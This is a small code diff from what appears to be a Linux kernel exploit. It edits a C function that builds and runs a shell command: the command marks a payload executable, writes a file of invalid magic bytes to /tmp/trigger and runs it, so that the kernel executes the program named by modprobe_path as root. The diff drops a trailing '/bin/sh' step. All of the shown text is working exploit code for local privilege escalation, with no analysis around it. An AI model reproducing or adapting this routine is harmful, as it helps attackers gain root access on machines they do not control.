@@ -436,8 +436,7 @@ void exec_modprobe_path(char *path, char *command) {
       "chmod +x %1$s;"
       "echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger;"
       "chmod +x /tmp/trigger;"
-      "/tmp/trigger;"
-      "/bin/sh";
+      "/tmp/trigger;";
   snprintf(buffer, sizeof(buffer), format, path, command);
   system(buffer);
 }
